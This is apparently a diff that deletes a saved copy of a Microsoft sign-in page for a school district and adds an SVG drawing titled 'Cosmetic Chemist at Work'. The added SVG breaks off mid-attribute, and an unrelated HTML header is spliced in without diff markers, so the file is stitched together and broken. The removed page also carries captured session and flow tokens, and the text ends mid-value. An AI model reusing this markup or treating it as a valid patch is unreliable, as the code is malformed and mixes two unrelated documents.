@@ -1,135 +1,563 @@
-
-
-
-<!-- Copyright (C) Microsoft Corporation. All rights reserved. -->
-<!DOCTYPE html>
-<html dir="ltr" class="" lang="en">
+<div style="display: flex; justify-content: center; margin: 20px 0;">
+                <svg width="650" height="300" viewBox="0 0 650 300">
+                    <!-- Background -->
+                    <rect x="10" y="10" width="630" height="280" rx="10" fill="#f8f9fa" stroke="#2c3e50" stroke-width="2"/>
+                    <text x="325" y="35" font-size="18" text-anchor="middle" font-weight="bold">Cosmetic Chemist at Work</text>
+                    
+                    <!-- Laboratory Scene -->
+                    <!-- Lab bench -->
+                    <rect x="50" y="120" width="550" height="20" fill="#7f8c8d" stroke="#333" stroke-width="1"/>
+                    <rect x="60" y="140" width="530" height="110" fill="#95a5a6" stroke="#333" stroke-width="1"/>
+                    
+                    <!-- Chemist figure -->
+                    <circle cx="200" cy="100" r="25" fill="#f5cba7" stroke="#333" stroke-width="1"/> <!-- head -->
+                    <rect x="190" y="125" width="20" height="45" fill="#ecf0f1" stroke="#333" stroke-width="1"/> <!-- lab coat torso -->
+                    <rect x="190" y="125" width="20" height="10" fill="#3498db" stroke="#333" stroke-width="1"/> <!-- shirt collar -->
+                    <line x1="190" y1="135" x2="160" y2="160" stroke="#ecf0f1" stroke-width="10"/> <!-- left arm -->
+                    <line x1="210" y1="135" x2="230" y2="145" stroke="#ecf0f1" stroke-width="10"/> <!-- right arm upper -->
+                    <line x1="230" y1="145" x2="240" y2="170" stroke="#ecf0f1" stroke-width="10"/> <!-- right arm lower -->
+                    <line x1="160" y1="160" x2="150" y2="170" stroke="#f5cba7" stroke-width="5"/> <!-- left hand -->
+                    <line x1="240" y1="170" x2="245" y2="180" stroke="#f5cba7" stroke-width="5"/> <!-- right hand -->
+                    <circle cx="195" cy="95" r="3" fill="#333"/> <!-- left eye -->
+                    <circle cx="205" cy="95" r="3" fill="#333"/> <!-- right eye -->
+                    <path d="M195,105 C198,110 202,110 205,105" stroke="#333" stroke-width="1" fill="none"/> <!-- smile -->
+                    <path d="M190,85 C190,80 200,75 210,85" stroke="#333" stroke-width="1" fill="none"/> <!-- hair -->
+                    
+                    <!-- Safety goggles -->
+                    <path d="M185,90 C185,85 195,85 195,90" stroke="#3498db" stroke-width="2" fill="none"/>
+                    <path d="M195,90 C195,85 205,85 205,90" stroke="#3498db" stroke-width="2" fill="none"/>
+                    <path d="M205,90 C205,85 215,85 215,90" stroke="#3498db" stroke-width="2" fill="none"/>
+                    
+                    <!-- Lab equipment -->
+                    <!-- Microscope -->
+                    <rect x="100" y="140" width="40" height="20" fill="#34495e" stroke="#333" stroke-width="1"/>
+                    <rect x="110" y="120" width="20" height="20" fill="#34495e" stroke="#333" stroke-width="1"/>
+                    <circle cx="120" cy="110" r="10" fill="#34495e" stroke="#333" stroke-width="1"/>
+                    
+                    <!-- Beakers and flasks -->
+                    <path d="M240,170 L230,200 L250,200 Z" fill="#d6eaf8" stroke="#333" stroke-width="1"/>
+                    <ellipse cx="240" cy="170" rx="10" ry="5" fill="none" stroke="#333" stroke-width="1"/>
+                    
+                    <path d="M270,160 C270,175 290,175 290,160 L290,140 L270,140 Z" fill="#ebdef0" stroke="#333" stroke-width="1"/>
+                    <ellipse cx="280" cy="140" rx="10" ry="5" fill="none" stroke="#333" stroke-width="1"/>
+                    
+                    <rect x="310" y="170" width="30" height="30" fill="#d5f5e3" stroke="#333" stroke-width="1"/>
+                    <line x1="310" y1="180" x2="340" y2="180" stroke="#333" stroke-width="1"/>
+                    <line x1="310" y1="190" x2="340" y2="190" stroke="#333" stroke-width="1"/>
+                    
+                    <!-- Test tubes in rack -->
+                    <rect x="360" y="170" width="80" height="10" fill="#e74c3c" stroke="#333" stroke-width="1"/>
+                    <rect x="365" y="140" width="10" height="30" fill="#d6eaf8" stroke="#333" stroke-width="1"/>
+                    <rect x="385" y="140" width="10" height="30" fill="#f9e79f" stroke="#333" stroke-width="1"/>
+                    <rect x="405" y="140" width="10" height="30" fill="#aed6f1" stroke="#333" stroke-width="1"/>
+                    <rect x="425" y="140" width="10" height="30" fill="#d5f5e3" stroke="#333" stroke-width="1"/>
+                    
+                    <!-- Computer -->
+                    <rect x="470" y="150" width="60" height="40" fill="#34495e" stroke="#333" stroke-width="1"/>
+                    <rect x="480" y="160" width="40" height="20" fill="#ecf0f1" stroke="#333" stroke-width="1"/>
+                    <line x1="485" y1="165" x2="515" y2="165" stroke="#333" stroke-width="1"/>
+                    <line x1="485" y1="170" x2="505" y2="170" stroke="#333" stroke-width="1"/>
+                    <line x1="485" y1="175" x2="510" y2="175" stroke="#333" stroke-width="1"/>
+                    
+                    <!-- Labels -->
+                    <text x="120" y="180" font-size="10" text-anchor="middle">Quality Testing</text>
+                    <text x="280" y="220" font-size="10" text-anchor="middle">Formulation</text>
+                    <text x="400" y="220" font-size="10" text-anchor="middle">Chemical Analysis</text>
+                    <text x="500" y="220" font-size="10" text-anchor="middle">Documentation</text>
+                    
+                    <!-- Education path in background -->
+                    <path d="M50,60 L150,60 L160,70 L270,70 L280,60 L380,60 L390,70 L500,70 L510,60 L600,60" 
+                          stroke="#3498db" stroke-width="2" stroke-dash<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Sign in to your account</title>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="-1">
-    <link rel="preconnect" href="https://aadcdn.msauth.net" crossorigin>
-<meta http-equiv="x-dns-prefetch-control" content="on">
-<link rel="dns-prefetch" href="//aadcdn.msauth.net">
-<link rel="dns-prefetch" href="//aadcdn.msftauth.net">
-
-    <meta name="PageID" content="ConvergedSignIn" />
-    <meta name="SiteID" content="" />
-    <meta name="ReqLC" content="1033" />
-    <meta name="LocLC" content="en-US" />
-
-
-        <meta name="format-detection" content="telephone=no" />
-
-    <noscript>
-        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
-    </noscript>
-
-    
-    
-<meta name="robots" content="none" />
-
-<script type="text/javascript" nonce='5ayvToqLbbGVRqjTMtK-IA'>//<![CDATA[
-$Config={"fShowPersistentCookiesWarning":false,"urlMsaSignUp":"https://login.live.com/oauth20_authorize.srf?scope=openid+profile+email+offline_access\u0026response_type=code\u0026client_id=51483342-085c-4d86-bf88-cf50c7252078\u0026response_mode=form_post\u0026redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2msa\u0026state=rQQIARAAjVJNaNNgGE7W_XV_dp48iuziNGvyJWmblOI6an-2fKlxabtEZKRfkqVps5Ym7doKIp48ePAkMpkHDx5UcIingSCCIDtN8SBDYehlTFCPcwcxehaRlxdeHnieB57nHcH4acvzGi4fDqOa0TaaM6juhOtay7PCrubUwo7habrmaTMdp9Y8PhLa-nmlcO71wuzje6PP7wyEjtbx4HKt0jZ-8x7iU_8W01zXaHov8TPL0TIDDCpGMSgWRSYAlFZmNEACg9Niph7TGcRwgDb0CLWD49f68N2-gUVfARz1sa3mKl_X3IrLr2qO4fIe4heTUOCpGeoPUtEJs950NI9vrboNA1XMiqGvB97gYinXham5miirllpS1mAmtwZTyQ4EqgV71U5czEDgT0cBCoC2WFVAgYGOaCklmIhr2YskysKI0OXscqYI1KVcSwGcJ4BaSwBpSs9YpgLSbjkzbynATcRFGfZEp1hV5CqAGcgqzvk16K9iz1n5VIGFtsRAuQDycoHNZ0QnLxcdVdYtMYVYxV7pqjJifV5HlCVacSRS7KFOPplIxH3Xqir5x9PAVIRDZTPGAoKlSJpgWEARGmMigkR-mjE_UDoKtgJTJAkoI4o4AlHIIDiSjBERgEhCZzSaNhFiKZrc6R876B8jA_zw8EgIO4GdxA778fsDfufvPwfdd6enhbs_-k6NhSew7YGwxC41pLQoRFY6doErq0KrLJWKjcWsmLK8ZPVCumAvNORFO1lOJmieujU4vj2IfR_Ebwxh60PYVvC_HmV31Df3Nqzbqf31_JNvj_a_DL-9_Olv4OYY_mIcO5y4-eHVg-2Nva_Zg2NnhahttZMRWHLTXbG90lLnG5Je6RVU16GMLhIjKacjmSIdztUTmyFsL4RtTwaDl57NLly_-jG7N4n9Ag2\u0026username=\u0026max_age=0\u0026estsfed=1\u0026uaid=557bfebac83f404bac9e0bbd980510fa\u0026signup=1\u0026lw=1\u0026fl=easi2\u0026fci=https%3a%2f%2fclever.com%2foauth%2fsaml%2fmetadata.xml","urlMsaLogout":"https://login.live.com/logout.srf?iframed_by=https%3a%2f%2flogin.microsoftonline.com","urlOtherIdpForget":"https://login.live.com/forgetme.srf?iframed_by=https%3a%2f%2flogin.microsoftonline.com","showCantAccessAccountLink":true,"arrExternalTrustedRealmFederatedIdps":[],"fEnableShowResendCode":true,"iShowResendCodeDelay":90000,"sSMSCtryPhoneData":"AF~Afghanistan~93!!!AX~Åland Islands~358!!!AL~Albania~355!!!DZ~Algeria~213!!!AS~American Samoa~1!!!AD~Andorra~376!!!AO~Angola~244!!!AI~Anguilla~1!!!AG~Antigua and Barbuda~1!!!AR~Argentina~54!!!AM~Armenia~374!!!AW~Aruba~297!!!AC~Ascension Island~247!!!AU~Australia~61!!!AT~Austria~43!!!AZ~Azerbaijan~994!!!BS~Bahamas~1!!!BH~Bahrain~973!!!BD~Bangladesh~880!!!BB~Barbados~1!!!BY~Belarus~375!!!BE~Belgium~32!!!BZ~Belize~501!!!BJ~Benin~229!!!BM~Bermuda~1!!!BT~Bhutan~975!!!BO~Bolivia~591!!!BQ~Bonaire~599!!!BA~Bosnia and Herzegovina~387!!!BW~Botswana~267!!!BR~Brazil~55!!!IO~British Indian Ocean Territory~246!!!VG~British Virgin Islands~1!!!BN~Brunei~673!!!BG~Bulgaria~359!!!BF~Burkina Faso~226!!!BI~Burundi~257!!!CV~Cabo Verde~238!!!KH~Cambodia~855!!!CM~Cameroon~237!!!CA~Canada~1!!!KY~Cayman Islands~1!!!CF~Central African Republic~236!!!TD~Chad~235!!!CL~Chile~56!!!CN~China~86!!!CX~Christmas Island~61!!!CC~Cocos (Keeling) Islands~61!!!CO~Colombia~57!!!KM~Comoros~269!!!CG~Congo~242!!!CD~Congo (DRC)~243!!!CK~Cook Islands~682!!!CR~Costa Rica~506!!!CI~Côte d\u0027Ivoire~225!!!HR~Croatia~385!!!CU~Cuba~53!!!CW~Curaçao~599!!!CY~Cyprus~357!!!CZ~Czechia~420!!!DK~Denmark~45!!!DJ~Djibouti~253!!!DM~Dominica~1!!!DO~Dominican Republic~1!!!EC~Ecuador~593!!!EG~Egypt~20!!!SV~El Salvador~503!!!GQ~Equatorial Guinea~240!!!ER~Eritrea~291!!!EE~Estonia~372!!!ET~Ethiopia~251!!!FK~Falkland Islands~500!!!FO~Faroe Islands~298!!!FJ~Fiji~679!!!FI~Finland~358!!!FR~France~33!!!GF~French Guiana~594!!!PF~French Polynesia~689!!!GA~Gabon~241!!!GM~Gambia~220!!!GE~Georgia~995!!!DE~Germany~49!!!GH~Ghana~233!!!GI~Gibraltar~350!!!GR~Greece~30!!!GL~Greenland~299!!!GD~Grenada~1!!!GP~Guadeloupe~590!!!GU~Guam~1!!!GT~Guatemala~502!!!GG~Guernsey~44!!!GN~Guinea~224!!!GW~Guinea-Bissau~245!!!GY~Guyana~592!!!HT~Haiti~509!!!HN~Honduras~504!!!HK~Hong Kong SAR~852!!!HU~Hungary~36!!!IS~Iceland~354!!!IN~India~91!!!ID~Indonesia~62!!!IR~Iran~98!!!IQ~Iraq~964!!!IE~Ireland~353!!!IM~Isle of Man~44!!!IL~Israel~972!!!IT~Italy~39!!!JM~Jamaica~1!!!JP~Japan~81!!!JE~Jersey~44!!!JO~Jordan~962!!!KZ~Kazakhstan~7!!!KE~Kenya~254!!!KI~Kiribati~686!!!KR~Korea~82!!!KW~Kuwait~965!!!KG~Kyrgyzstan~996!!!LA~Laos~856!!!LV~Latvia~371!!!LB~Lebanon~961!!!LS~Lesotho~266!!!LR~Liberia~231!!!LY~Libya~218!!!LI~Liechtenstein~423!!!LT~Lithuania~370!!!LU~Luxembourg~352!!!MO~Macao SAR~853!!!MG~Madagascar~261!!!MW~Malawi~265!!!MY~Malaysia~60!!!MV~Maldives~960!!!ML~Mali~223!!!MT~Malta~356!!!MH~Marshall Islands~692!!!MQ~Martinique~596!!!MR~Mauritania~222!!!MU~Mauritius~230!!!YT~Mayotte~262!!!MX~Mexico~52!!!FM~Micronesia~691!!!MD~Moldova~373!!!MC~Monaco~377!!!MN~Mongolia~976!!!ME~Montenegro~382!!!MS~Montserrat~1!!!MA~Morocco~212!!!MZ~Mozambique~258!!!MM~Myanmar~95!!!NA~Namibia~264!!!NR~Nauru~674!!!NP~Nepal~977!!!NL~Netherlands~31!!!NC~New Caledonia~687!!!NZ~New Zealand~64!!!NI~Nicaragua~505!!!NE~Niger~227!!!NG~Nigeria~234!!!NU~Niue~683!!!NF~Norfolk Island~672!!!KP~North Korea~850!!!MK~North Macedonia~389!!!MP~Northern Mariana Islands~1!!!NO~Norway~47!!!OM~Oman~968!!!PK~Pakistan~92!!!PW~Palau~680!!!PS~Palestinian Authority~970!!!PA~Panama~507!!!PG~Papua New Guinea~675!!!PY~Paraguay~595!!!PE~Peru~51!!!PH~Philippines~63!!!PL~Poland~48!!!PT~Portugal~351!!!PR~Puerto Rico~1!!!QA~Qatar~974!!!RE~Réunion~262!!!RO~Romania~40!!!RU~Russia~7!!!RW~Rwanda~250!!!BL~Saint Barthélemy~590!!!KN~Saint Kitts and Nevis~1!!!LC~Saint Lucia~1!!!MF~Saint Martin~590!!!PM~Saint Pierre and Miquelon~508!!!VC~Saint Vincent and the Grenadines~1!!!WS~Samoa~685!!!SM~San Marino~378!!!ST~São Tomé and Príncipe~239!!!SA~Saudi Arabia~966!!!SN~Senegal~221!!!RS~Serbia~381!!!SC~Seychelles~248!!!SL~Sierra Leone~232!!!SG~Singapore~65!!!SX~Sint Maarten~1!!!SK~Slovakia~421!!!SI~Slovenia~386!!!SB~Solomon Islands~677!!!SO~Somalia~252!!!ZA~South Africa~27!!!SS~South Sudan~211!!!ES~Spain~34!!!LK~Sri Lanka~94!!!SH~St Helena, Ascension, and Tristan da Cunha~290!!!SD~Sudan~249!!!SR~Suriname~597!!!SJ~Svalbard~47!!!SZ~Swaziland~268!!!SE~Sweden~46!!!CH~Switzerland~41!!!SY~Syria~963!!!TW~Taiwan~886!!!TJ~Tajikistan~992!!!TZ~Tanzania~255!!!TH~Thailand~66!!!TL~Timor-Leste~670!!!TG~Togo~228!!!TK~Tokelau~690!!!TO~Tonga~676!!!TT~Trinidad and Tobago~1!!!TA~Tristan da Cunha~290!!!TN~Tunisia~216!!!TR~Turkey~90!!!TM~Turkmenistan~993!!!TC~Turks and Caicos Islands~1!!!TV~Tuvalu~688!!!VI~U.S. Virgin Islands~1!!!UG~Uganda~256!!!UA~Ukraine~380!!!AE~United Arab Emirates~971!!!GB~United Kingdom~44!!!US~United States~1!!!UY~Uruguay~598!!!UZ~Uzbekistan~998!!!VU~Vanuatu~678!!!VA~Vatican City~39!!!VE~Venezuela~58!!!VN~Vietnam~84!!!WF~Wallis and Futuna~681!!!YE~Yemen~967!!!ZM~Zambia~260!!!ZW~Zimbabwe~263","fUseInlinePhoneNumber":true,"fDetectBrowserCapabilities":true,"fUseMinHeight":true,"fShouldSupportTargetCredentialForRecovery":true,"fAvoidNewOtcGenerationWhenAlreadySent":true,"fUsePromotedFedCredTypesArray":true,"fUseCertificateInterstitialView":true,"fIsPasskeySupportEnabled":true,"arrPromotedFedCredTypes":[],"fShowUserAlreadyExistErrorHandling":true,"fBlockOnAppleEmailClaimError":true,"fIsVerifiableCredentialsSupportEnabled":true,"iVerifiableCredentialPresentationPollingIntervalSeconds":0.5,"iVerifiableCredentialPresentationPollingTimeoutSeconds":300,"fIsQrPinEnabled":true,"fPasskeyAssertionRedirect":true,"fSamlAndOidcCompatibleUx":true,"fFixUrlExternalIdpFederation":true,"fUpdateFacebookIcon":true,"fEnableBackButtonBugFix":true,"urlSessionState":"https://login.microsoftonline.com/common/DeviceCodeStatus","urlResetPassword":"https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2f69cbf852-5103-4521-a4fc-0ca208202372%2freprocess%3fctx%3drQQIARAAjVJBa9NgGE7XdW5zm9WTR5FdnGZJviRtk1K0o7brlu-rsUm75CJfviRL02YtTbql9Q948OBRJnrw4EE8iMeBIIIgO03wIOJh4G0H8Th3EIM_QOR9Xnh54XkeeN53npJXvCgahDLDkJ6z6wxXST9g-ngUeUyIgx4TOBG2cYRX46A3vDSfPfh9X7_5cfPWq2fn3z7OZM9eppb_LYDD0BlG71PX7-UtAThcgRNIIU9cADhsCRiwwJFwwbULtkAECfCOneOOUqmvU5lmQgdnU-JouCP3cdgJ5R0cOKEcEblZhorMrXJ_Nx2bdvvDAEfyaCccOKTjdhx7P_0phdr1Mays9ZBmembb2IO1-h6slGMITA9OunER1SBIKjaAAaCPugbQBRggz2jDUhGv32XJOswpY8m3ai1gbtVHBpAiBfRGCqhyds1zDVANrdqGZ4CwVEQanKCg1TW0LoA1KBrB7T2YtOGveY2KLkJfFaCmg4ami40aChpaKzA120MVIhr-9tjUiJjwYqSpvBGoLJqQuFEulYqJa9dUk-FNejknEcstiIAWOZanBRFwNBZcQrMkibKQpMnnwUF6mWUB5-SJRBOOOLTEsgU6BwhL2wLmeZcQkePZo-mFk-kFNi3Pzs5nqcvUFep0OvU8kxz5y_e58PO1FeXJr6mrC8wSdZhhVHFroFaRktuOfV2yTGVkqe3WoLmOKl5U7t6p6v7mQGv6Zatc4mXu0czi4Qz1cyb14By1f446mPuvL3m3SJ0uPfz24cXh0-Mf6ycXbih539st52A7rI7R7vbI3Biodmeim2HAOWOCcpUgVl3EM_V-6XWWOk5wkfoD0\u0026mkt=en-US\u0026hosted=0\u0026device_platform=Windows+10","urlMsaResetPassword":"https://account.live.com/password/reset?wreply=https%3a%2f%2flogin.microsoftonline.com%2f69cbf852-5103-4521-a4fc-0ca208202372%2freprocess%3fctx%3drQQIARAAjVJNaNNgGE7adVv3o50njyK7OM2afEn6k1JcR-3Pli81NmmXiEj6JVmaNmtp0q2tIOLJgwdPIpN58OBBBUU8DQQRBNlpigcZCkMvY4J6nDuIwbOIvLzw8sDzPPA87xjGzVie13a5aBQ1jVWjM4taTrSldT0r6mpOM-oYnqZrnjbbc5qdY2ORzV9X5LNvFuce3xt_cScUOXyIT_9bQHNdo-O9wk9fjtcYYFAJikGJODIBoLQaowESGEktYeoJnUFMEtCGHqO2cfxaAN8JhMq-AjgMsN3OCtfS3LrLrWiO4XIe4soZyHPULPUHqeuE2eo4msd1V9y2gepm3dDXg29xoVrsw-x8U5BUS60qazBfXIPZTA8C1YKDRi8l5CHwp6cABUBbaChAZqAjWEoVplNa4QKJCjDG95N2LV8B6lKxq4Ckx4Nmlwc5Ss9bpgJybi2_YCnATacECQ4Ep9JQpAaAecgqzrk16K9iz1ulrMxCW2SgJIOSJLOlvOCUpIqjSrolZBGr2Mt9VUKsz-sJkkgrjkgKA9QrZdLplO_aUEX_eBacjiVRzUywgGApkiYYFlCExpiIIJGfZsIPlI6DzeA0SQLKiKMkgShkEEmSTBAxgEhCZzSaNhFiKZrcHprYH5ogg9zo6FgEO46dwA6G8Pshv-cPX8Lu-1Mz_N2fgZMT0SPYVigqskttMSfwseWeLSdrKt-tidVKu1wQspaXaZzPyfZiWyrbmVomTXPUreHJrWHsxzB-YwRbH8E2w__1KDvjvrm3Yd3O7q2Xnnx_tPd19N2lz38DX05iB0dufnz9YGtj91th_-gZPm5bq5kYrLq5vrC63FUX2qJeH8iq61BGHwmxrNMTTYGOFlvppxFsN4JtTYXDF5_PLV6_-qmwO4X9Bg2\u0026mkt=en-US","fFixUrlResetPassword":true,"urlGetCredentialType":"https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US","urlGetRecoveryCredentialType":"https://login.microsoftonline.com/common/getrecoverycredentialtype?mkt=en-US","urlGetOneTimeCode":"https://login.microsoftonline.com/common/GetOneTimeCode","urlLogout":"https://login.microsoftonline.com/69cbf852-5103-4521-a4fc-0ca208202372/uxlogout","urlForget":"https://login.microsoftonline.com/forgetuser","urlDisambigRename":"https://go.microsoft.com/fwlink/p/?LinkID=733247","urlDeviceFingerprinting":"","urlPIAEndAuth":"https://login.microsoftonline.com/common/PIA/EndAuth","urlStartTlr":"https://login.microsoftonline.com/common/start/tlr#continuationToken=%7b0%7d\u0026undirectedRecoveryUrl=%7b1%7d","fKMSIEnabled":false,"iLoginMode":6,"fAllowPhoneSignIn":true,"fAllowPhoneInput":true,"iMaxPollErrors":5,"iPollingTimeout":60,"iDefaultLoginOptions":1,"srsSuccess":true,"fLockUsername":true,"fShowSwitchUser":true,"arrValErrs":["70044"],"sErrorCode":"70044","sWAMExtension":"ppnbnpeolgkicgegkbkbjmhlideopiji","sWAMChannel":"53ee284d-920a-4b59-9d30-a60315b26836","sErrTxt":"","sResetPasswordPrefillParam":"username","fPOST_ForceSignin":true,"onPremPasswordValidationConfig":{"isUserRealmPrecheckEnabled":true},"fSwitchDisambig":true,"fUseConsumerEmailError":true,"iRemoteNgcPollingType":2,"oGetCredTypeResult":{"Username":"E000000@muscogee.k12.ga.us","Display":"E000000@muscogee.k12.ga.us","IfExistsResult":0,"IsUnmanaged":false,"ThrottleStatus":1,"Credentials":{"PrefCredential":1,"HasPassword":true,"OtcNotAutoSent":false},"DfpProperties":{},"EstsProperties":{"UserTenantBranding":[{"Locale":0,"BannerLogo":"https://aadcdn.msauthimages.net/dbd5a2dd-e4kgm8e6gwdg2vizfydams7z-ujwyvruz8uixy2xwx8/logintenantbranding/0/bannerlogo?ts=637534861683509065","Illustration":"https://aadcdn.msauthimages.net/dbd5a2dd-e4kgm8e6gwdg2vizfydams7z-ujwyvruz8uixy2xwx8/logintenantbranding/0/illustration?ts=637533979620581079","BoilerPlateText":"<p><strong>Staff will use their E0 or C0 number followed by</strong>\n@muscogee.k12.ga.us to log in. Examples:\n<strong>E000000@muscogee.k12.ga.us\nC000000@muscogee.k12.ga.us</strong></p>\n<p><strong>Students will use their GTID followed by</strong>\n@mcsdgas.com to login.\nExample: <strong>123456789@mcsdgas.com</strong></p>\n<p><em>The password is your normal MCSD network/email/computer password.</em></p>\n","KeepMeSignedInDisabled":false,"UseTransparentLightBox":false}],"DomainType":3},"FlowToken":"AQABIQEAAABVrSpeuWamRam2jAF1XRQEPQ7f_uR9SReD48GrqBX1tl1R2jYS8Lp-DwMVVDGVTLNRFH8ZWBRvu7aZ19lZnGMeB1byJBZdBHqu1n7ctmyf1Kj9nDKkqyRurNXGFdYaXf2ZMQVh5E7BGAsl9SPPiGzhsQwWslUqyheFy47ZF1AmfERafUchhpg7jCPUr-b3SWuzNQXZnyh0VMWVFzN4Z-uKjfiOhQF3cZaKYZ3PAtkPfgZBoN1nRNFDr_VXS3nreSbaW1llkU_R-QYVVT4NppxvOs05w4H53Dp3JKxGeNeyPoU4olbVEbQSot1DAVBGROOL-UCFjNOpTPO76rhrcLRFT4OZdrBTjW_zy7sb-ef-5_nzKNapS3csGkwrNwAZShjHDKHBHz5vP9kJjf5kdpLo_tp_GVGxA9GtkWSyYGZSRO7h5ZdRCKPij3Wxoj_9V7RrgobwDJ_06JeoXcOQ8zG_nAEACsQEYGwU2zifhiULspX_K2SbLX4UjrLLBi8_qtxLLOC_SwReJQc5fdpTtdCmEHMHDf4V-MEnqi1YP1O4eGUVM6dWwqu2ApG55LOVkl780x2YpPB6sh8LIgEFwFXLFZzqFb5Wti3JixA1IO25ZxG47YCc22faL1hChnryU13f-D3voW3B6OjkwCMxJokPdCKg-lznnC-fzGEsx5l9IiAA","IsSignupDisallowed":true},"fUseNewNoPasswordTypes":true,"urlAadSignup":"https://signup.microsoft.com/signup?sku=teams_commercial_trial\u0026origin=ests\u0026culture=en-US","sCloudInstanceName":"microsoftonline.com","fShowSignInOptionsAsButton":true,"fUseNewPhoneSignInError":true,"fImprovePhoneDisambig":true,"fIsUpdatedAutocompleteEnabled":true,"fActivateFocusOnApprovalNumberRemoteNGC":true,"fIsPasskey":true,"fEnableDFPIntegration":true,"fEnableCenterFocusedApprovalNumber":true,"fShowPassKeyErrorUCP":true,"fFixPhoneDisambigSignupRedirect":true,"fEnableFIDOBluetoothError":true,"fEnableQrCodeA11YFixes":true,"fEnablePasskeyAwpError":true,"iMaxStackForKnockoutAsyncComponents":10000,"fShowButtons":true,"urlCdn":"https://aadcdn.msauth.net/shared/1.0/","urlDefaultFavicon":"https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico","urlFooterTOU":"https://www.microsoft.com/en-US/servicesagreement/","urlFooterPrivacy":"https://privacy.microsoft.com/en-US/privacystatement","urlPost":"https://login.microsoftonline.com/69cbf852-5103-4521-a4fc-0ca208202372/login","urlPostAad":"https://login.microsoftonline.com/69cbf852-5103-4521-a4fc-0ca208202372/login","urlPostMsa":"https://login.live.com/ppsecure/partnerpost.srf?scope=openid+profile+email+offline_access\u0026response_type=code\u0026client_id=51483342-085c-4d86-bf88-cf50c7252078\u0026response_mode=form_post\u0026redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2msa\u0026state=rQQIARAAjVJNaNNgGE7W_XV_dp48iuziNGvyJWmblOI6an-2fKlxabtEZKRfkqVps5Ym7doKIp48ePAkMpkHDx5UcIingSCCIDtN8SBDYehlTFCPcwcxehaRlxdeHnieB57nHcH4acvzGi4fDqOa0TaaM6juhOtay7PCrubUwo7habrmaTMdp9Y8PhLa-nmlcO71wuzje6PP7wyEjtbx4HKt0jZ-8x7iU_8W01zXaHov8TPL0TIDDCpGMSgWRSYAlFZmNEACg9Niph7TGcRwgDb0CLWD49f68N2-gUVfARz1sa3mKl_X3IrLr2qO4fIe4heTUOCpGeoPUtEJs950NI9vrboNA1XMiqGvB97gYinXham5miirllpS1mAmtwZTyQ4EqgV71U5czEDgT0cBCoC2WFVAgYGOaCklmIhr2YskysKI0OXscqYI1KVcSwGcJ4BaSwBpSs9YpgLSbjkzbynATcRFGfZEp1hV5CqAGcgqzvk16K9iz1n5VIGFtsRAuQDycoHNZ0QnLxcdVdYtMYVYxV7pqjJifV5HlCVacSRS7KFOPplIxH3Xqir5x9PAVIRDZTPGAoKlSJpgWEARGmMigkR-mjE_UDoKtgJTJAkoI4o4AlHIIDiSjBERgEhCZzSaNhFiKZrc6R876B8jA_zw8EgIO4GdxA778fsDfufvPwfdd6enhbs_-k6NhSew7YGwxC41pLQoRFY6doErq0KrLJWKjcWsmLK8ZPVCumAvNORFO1lOJmieujU4vj2IfR_Ebwxh60PYVvC_HmV31Df3Nqzbqf31_JNvj_a_DL-9_Olv4OYY_mIcO5y4-eHVg-2Nva_Zg2NnhahttZMRWHLTXbG90lLnG5Je6RVU16GMLhIjKacjmSIdztUTmyFsL4RtTwaDl57NLly_-jG7N4n9Ag2\u0026username=E000000@muscogee.k12.ga.us\u0026flow=fido\u0026max_age=0\u0026estsfed=1\u0026uaid=557bfebac83f404bac9e0bbd980510fa\u0026fci=https%3a%2f%2fclever.com%2foauth%2fsaml%2fmetadata.xml","urlRefresh":"https://login.microsoftonline.com/69cbf852-5103-4521-a4fc-0ca208202372/reprocess?ctx=rQQIARAAjVJNaNNgGE7adVv3o50njyK7OM2afEn6k1JcR-3Pli81NmmXiEj6JVmaNmtp0q2tIOLJgwdPIpN58OBBBUU8DQQRBNlpigcZCkMvY4J6nDuIwbOIvLzw8sDzPPA87xjGzVie13a5aBQ1jVWjM4taTrSldT0r6mpOM-oYnqZrnjbbc5qdY2ORzV9X5LNvFuce3xt_cScUOXyIT_9bQHNdo-O9wk9fjtcYYFAJikGJODIBoLQaowESGEktYeoJnUFMEtCGHqO2cfxaAN8JhMq-AjgMsN3OCtfS3LrLrWiO4XIe4soZyHPULPUHqeuE2eo4msd1V9y2gepm3dDXg29xoVrsw-x8U5BUS60qazBfXIPZTA8C1YKDRi8l5CHwp6cABUBbaChAZqAjWEoVplNa4QKJCjDG95N2LV8B6lKxq4Ckx4Nmlwc5Ss9bpgJybi2_YCnATacECQ4Ep9JQpAaAecgqzrk16K9iz1ulrMxCW2SgJIOSJLOlvOCUpIqjSrolZBGr2Mt9VUKsz-sJkkgrjkgKA9QrZdLplO_aUEX_eBacjiVRzUywgGApkiYYFlCExpiIIJGfZsIPlI6DzeA0SQLKiKMkgShkEEmSTBAxgEhCZzSaNhFiKZrcHprYH5ogg9zo6FgEO46dwA6G8Pshv-cPX8Lu-1Mz_N2fgZMT0SPYVigqskttMSfwseWeLSdrKt-tidVKu1wQspaXaZzPyfZiWyrbmVomTXPUreHJrWHsxzB-YwRbH8E2w__1KDvjvrm3Yd3O7q2Xnnx_tPd19N2lz38DX05iB0dufnz9YGtj91th_-gZPm5bq5kYrLq5vrC63FUX2qJeH8iq61BGHwmxrNMTTYGOFlvppxFsN4JtTYXDF5_PLV6_-qmwO4X9Bg2","urlCancel":"https://clever.com/oauth/saml/assert?error=access_denied\u0026error_subcode=cancel\u0026state=NWIyMDBlNTZhZWYwMGIwMDAxM2ZhMzkx%3bNGM2M2MxY2Y2MjNkY2U4MmNhYWM%3d%3baHR0cHM6Ly9jbGV2ZXIuY29tL2luL2F1dGhfY2FsbGJhY2s%3d%3bNTMzNmVkYTk2MGM5YmEwMmEwYjBhODU5MjQ4MTU2OTU5OGNmOTVmZTdhNDc5YjgyZTc5MGMxNTQ3YmQ0NzcxOA%3d%3d%3bY29kZQ%3d%3d%3b","urlResume":"